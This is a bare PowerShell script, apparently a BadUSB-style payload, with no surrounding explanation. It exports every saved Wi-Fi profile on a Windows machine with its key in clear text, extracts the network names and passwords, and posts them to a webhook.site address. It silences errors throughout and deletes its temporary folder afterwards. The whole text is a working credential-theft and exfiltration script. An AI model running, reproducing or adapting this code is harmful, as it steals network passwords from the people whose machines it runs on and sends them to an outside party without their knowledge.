$p=Join-Path $env:TEMP 'p';New-Item -Path $p -ItemType Directory -Force -EA SilentlyContinue|Out-Null;Set-Location $p -EA SilentlyContinue;netsh wlan export profile key=clear|Out-Null;$r=Get-ChildItem -Filter "*.xml"|%{$x=[xml](Get-Content $_.FullName -EA SilentlyContinue);if($x.WLANProfile.Name -and $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial){[PSCustomObject]@{SSID=$x.WLANProfile.Name;Password=$x.WLANProfile.MSM.Security.SharedKey.KeyMaterial}}};$f=($r|%{"$($_.SSID) >> $($_.Password)"}) -join "`n";$content="r`n$f`n``````";$bytes=[System.Text.Encoding]::UTF8.GetBytes($content);Invoke-RestMethod -Uri 'https://webhook.site/75342571-78da-45fc-8f61-caf01ffc1f5f' -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8' -EA SilentlyContinue;Set-Location .. -EA SilentlyContinue;Remove-Item $p -Recurse -Force -EA SilentlyContinue

